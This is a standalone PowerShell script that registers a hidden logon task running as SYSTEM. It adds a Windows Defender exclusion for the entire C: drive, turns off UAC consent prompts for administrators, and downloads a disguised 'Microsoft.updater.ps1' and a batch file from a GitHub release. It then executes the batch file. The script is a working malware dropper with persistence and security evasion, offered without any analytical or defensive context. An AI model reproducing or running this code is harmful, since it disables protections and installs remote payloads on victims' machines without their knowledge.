$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -command
"Add-MpPreference -ExclusionPath \"C:\";
Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name
ConsentPromptBehaviorAdmin -Value 0;
$url1 = \"https://github.com/AhmedK97/Xwqd21WaDdqwdv/releases/download/1.0/Microsoft.updater.ps1\";
$downloadsFolder1 = [Environment]::GetFolderPath(\"User\");
$outputPath1 = Join-Path -Path $downloadsFolder1 -ChildPath \"download.ps1\";
Invoke-WebRequest -Uri $url1 -OutFile $outputPath1;
while ((Test-Path -Path $outputPath1) -eq $false) {
Start-Sleep -Seconds 1
};
$url = \"https://github.com/AhmedK97/Xwqd21WaDdqwdv/releases/download/1.0/run.bat\";
$downloadsFolder = [Environment]::GetFolderPath(\"User\");
$outputPath = Join-Path -Path $downloadsFolder -ChildPath \"RunExclusion.bat\";
Invoke-WebRequest -Uri $url -OutFile $outputPath;
while ((Test-Path -Path $outputPath) -eq $false) {
Start-Sleep -Seconds 1
};
Start-Process -FilePath $outputPath"'
$Trigger = New-ScheduledTaskTrigger -AtLogon
$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
Register-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -TaskName
"MyScheduledTask"
